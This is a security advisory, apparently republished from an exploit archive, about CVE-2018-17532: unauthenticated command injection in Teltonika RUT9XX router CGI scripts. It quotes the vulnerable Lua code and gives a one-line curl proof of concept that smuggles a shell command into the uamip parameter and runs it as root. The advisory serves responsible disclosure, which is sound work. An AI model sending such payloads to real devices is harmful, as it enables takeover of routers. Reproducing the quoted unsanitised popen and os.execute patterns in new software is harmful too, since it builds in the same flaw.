@@ -1,0 +1,203 @@
+id: 31320
+date: 10/12/2018
+title: Teltonika RUT9XX Unauthenticated OS Command Injection Exploit
+author: David Gnedt
+cves: 
+
+# Teltonika RUT9XX Unauthenticated OS Command Injection #
+
+Link: https://github.com/sbaresearch/advisories/tree/public/2018/SBA-ADV-20180319-01_Teltonika_OS_Command_Injection
+
+## Vulnerability Overview ##
+
+Teltonika RUT9XX routers with firmware before 00.04.233 are prone to
+multiple unauthenticated OS command injection vulnerabilities in
+`autologin.cgi` and `hotspotlogin.cgi` due to insufficient user input
+sanitization. This allows remote attackers to execute arbitrary
+commands with root privileges.
+
+* **Identifier**            : SBA-ADV-20180319-01
+* **Type of Vulnerability** : OS Command Injection
+* **Software/Product Name** : [Teltonika RUT955](https://teltonika.lt/product/rut955/)
+* **Vendor**                : [Teltonika](https://teltonika.lt/)
+* **Affected Versions**     : Firmware RUT9XX_R_00.04.172 and probably prior
+* **Fixed in Version**      : RUT9XX_R_00.04.233
+* **CVE ID**                : CVE-2018-17532
+* **CVSSv3 Vector**         : CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+* **CVSSv3 Base Score**     : 9.8 (Critical)
+
+## Vendor Description ##
+
+> RUT955 is a highly reliable and secure LTE router with I/O, GNSS and
+> RS232/RS485 for professional applications. Router delivers high
+> performance, mission-critical cellular communication and GPS location
+> capabilities.
+
+Source: <https://teltonika.lt/product/rut955/>
+
+## Impact ##
+
+An attacker can fully compromise the device, by exploiting the
+vulnerabilities documented in this advisory. Sensitive data stored or
+transmitted via the device might get exposed through this attack.
+
+We recommend upgrading to version RUT9XX_R_00.04.233 or newer, which
+includes fixes for the vulnerabilities described in this advisory.
+
+## Vulnerability Description ##
+
+Several parameters of the scripts `autologin.cgi` and `hotspotlogin.cgi`
+are affected by OS command injection vulnerabilities. The scripts are
+part of the coova-chilli captive portal. However, the vulnerabilities
+are exploitable regardless of the device configuration, even if no
+captive portal is configured.
+
+More concretely, the following parameters are vulnerable:
+
+* `/cgi-bin/autologin.cgi`
+  * reply
+  * uamport
+  * challenge
+  * userurl
+  * res
+  * reason
+  * *If* res=success
+    * uamip
+    * uamport
+    * userurl
+* `/cgi-bin/hotspotlogin.cgi`
+  * *If* send=1
+    * uamip
+    * TelNum
+    * challenge
+    * uamport
+    * userurl
+  * *If* button=1 or (res=wispr and UserName=1)
+    * uamport
+    * uamip
+  * *If* res=success or res=already or res=popup2
+    * uamip
+    * uamport
+  * *If* res=logoff or res=popup3
+    * uamip
+    * uamport
+
+The affected scripts use these parameters to build OS commands via
+string concatenation without proper sanitization.
+
+The vulnerabilities are located in the source files `hotspotlogin.cgi`
+and `landing_page_functions.lua`, which is included from `autologin.cgi`
+and `hotspotlogin.cgi`.
+
+The `landing_page_functions.lua` script provides multiple functions,
+which are either vulnerable to OS command injection themselves or
+propagate insecure usage.
+
+For example, it provides the function `getParam`, which directly passes
+the argument to `io.popen`:
+
+```lua
+[...]
+function getParam(string)
+        local h = io.popen(string)
+        local t = h:read()
+        h:close()
+        return t
+end
+[...]
+```
+
+`landing_page_functions.lua` also provides the functions `debug` and
+`get_ifname`, which use `os.execute` and `getParam` in an insecure way:
+
+```lua
+[...]
+function debug(string)
+        if debug_enable == 1 then
+                os.execute("/usr/bin/logger -t hotspotlogin.cgi \""..string.."\"")
+        end
+end
+[...]
+function get_ifname(ip)
+        local result = getParam(format("ip addr | grep \"%s\"", ip))
+        local tun = string.match(result, "(tun%d+)")
+        local ifname = "wlan0"
+[...]
+```
+
+For example, `hotspotlogin.cgi` makes use of the functions `get_ifname` and
+`getParam`. Occasionally, it also insecurely uses `os.execute` directly:
+
+```lua
+[...]
+if send and send ~= "" and tel_num then
+        local ifname = get_ifname(uamip)
+        local pass = generate_code(ifname) or "0000"
+        tel_num = tel_num:gsub("%%2B", "+")
+        local exists = getParam("grep \"" ..tel_num.. "\" /etc/chilli/" .. ifname .. "/smsusers")
+        local user = string.format("%s", pass)
+        local uri = os.getenv("REQUEST_URI")
+        local message = string.format("%s Password - %s  \n Link - http://%s%s?challenge=%s&uamport=%s&uamip=%s&userurl=%s&UserName=%s&button=1", tel_num, pass, uamip, uri, challenge, uamport, uamip, userurl, pass)
+        local smsotp_mesg=string.format("%s;%s", tel_num, pass)
+        message = getParam(string.format("/usr/sbin/gsmctl -Ss \"%s\"", message))
+
+        if message == "OK" then
+                os.execute("echo \""..smsotp_mesg.."\" >> /tmp/smsotp.log")
+                sms = "sent"
+                if exists then
+                        os.execute("sed -i 's/" ..exists.. "/" ..user.. "/g' /etc/chilli/" .. ifname .. "/smsusers")
+                else
+                        os.execute("echo \"" ..user.. "\" >>/etc/chilli/" .. ifname .. "/smsusers")
+                end
+[...]
+```
+
+In one of the first lines of the above code snippet, `hotspotlogin.cgi`
+calls `get_ifname` with unsanitized user input from the parameter
+`uamip`. A few lines later it calls `getParam` with unsanitized user
+input from the parameter `TelNum`. In a further call to `getParam` it
+uses more unsanitized user input.
+
+There are futher locations that call insecure functions like `debug`
+and `get_ifname` either directly or indirectly with user input from the
+scripts `autologin.cgi` and `hotspotlogin.cgi`.
+
+## Proof-of-Concept ##
+
+For example, an attacker can exploit this vulnerability by manipulating
+the `uamip` parameter:
+
+```sh
+curl -v -o /dev/null "http://$IP/cgi-bin/hotspotlogin.cgi" -d 'send=1&uamip="; id >/tmp/test #'
+```
+
+The device executes the commands with root privileges:
+
+```bash
+# cat /tmp/test
+uid=0(root) gid=0(root)
+```
+
+## Timeline ##
+
+* `2018-03-19` identification of vulnerability in version RUT9XX_R_00.04.84
+* `2018-04-10` detailed analysis of version RUT9XX_R_00.04.161
+* `2018-04-16` re-test of version RUT9XX_R_00.04.172
+* `2018-04-16` initial vendor contact through public address
+* `2018-04-18` vendor response with security contact
+* `2018-04-19` disclosed vulnerability to vendor security contact
+* `2018-04-26` vendor released fix in version RUT9XX_R_00.04.233
+* `2018-07-09` re-test of version RUT9XX_R_00.05.00.5
+* `2018-09-25` request CVE from MITRE
+* `2018-09-26` MITRE assigned CVE-2018-17532
+* `2018-10-11` public disclosure
+
+## References ##
+
+* Firmware Changelog: <https://wiki.teltonika.lt/index.php?title=RUT9xx_Firmware>
+
+## Credits ##
+
+* David Gnedt ([SBA Research](https://www.sba-research.org/))
+
+#  0day.today [2023-03-27]  #
